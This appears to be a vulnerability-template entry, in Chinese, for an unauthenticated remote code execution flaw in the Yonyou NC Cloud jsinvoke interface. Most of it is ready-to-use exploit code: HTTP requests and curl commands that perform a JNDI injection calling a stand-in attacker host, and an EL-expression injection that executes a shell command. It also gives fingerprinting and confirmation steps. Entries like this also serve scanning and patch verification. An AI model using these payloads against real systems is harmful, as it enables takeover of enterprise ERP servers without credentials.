---
id: YONGYOU-NC-JSINVOKE-RCE
title: 用友 NC Cloud jsinvoke JNDI/EL表达式注入 RCE
product: yongyou
vendor: 用友
version_affected: "NC63, NC65, NC Cloud 1903-2207, YonBIP"
severity: CRITICAL
tags: [rce, jndi, el_injection, 无需认证, 国产, erp]
fingerprint: ["用友", "NC", "NCCloud", "yongyou", "/uapjs/", "jsinvoke"]
---

## 漏洞描述

用友 NC Cloud jsinvoke 接口存在 JNDI 注入和 EL 表达式注入漏洞，攻击者可未授权实现远程代码执行。对应 CNVD-C-2023-76801。

## 影响版本

- NC63, NC633, NC65
- NC Cloud 1903, 1909, 2005, 2105, 2111
- YonBIP 高级版 2207

## 前置条件

- 无需认证
- JNDI注入方式需要外部 JNDI/LDAP 服务（如 JNDIExploit）

## 利用步骤

### 方式一：JNDI 注入

需要 JNDI 工具：https://github.com/WhiteHSBG/JNDIExploit

```http
POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
Host: target
Content-Type: application/json

{"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${jndi:ldap://attacker.com/Exploit}","test"]}
```

### 方式二：EL 表达式注入

```http
POST /uapjs/jsinvoke/?action=invoke&error=bsh.Interpreter&cmd=exec("id") HTTP/1.1
Host: target
Content-Type: application/json

{"serviceName":"${param.getClass().forName(param.error).newInstance().eval(param.cmd)}","methodName":"test","parameterTypes":[],"parameters":[]}
```

## Payload

### JNDI 注入

```bash
curl -s -X POST "http://target/uapjs/jsinvoke/?action=invoke" \
  -H "Content-Type: application/json" \
  -d '{"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${jndi:ldap://attacker.com/Exploit}","test"]}'
```

### EL 表达式注入

```bash
curl -s -X POST 'http://target/uapjs/jsinvoke/?action=invoke&error=bsh.Interpreter&cmd=exec("id")' \
  -H "Content-Type: application/json" \
  -d '{"serviceName":"${param.getClass().forName(param.error).newInstance().eval(param.cmd)}","methodName":"test","parameterTypes":[],"parameters":[]}'
```

## 验证方法

JNDI 方式通过 DNSLog 回连确认；EL 方式响应中包含命令执行结果。

## 指纹确认

```bash
curl -s -o /dev/null -w "%{http_code}" "http://target/uapjs/jsinvoke/?action=invoke"
```
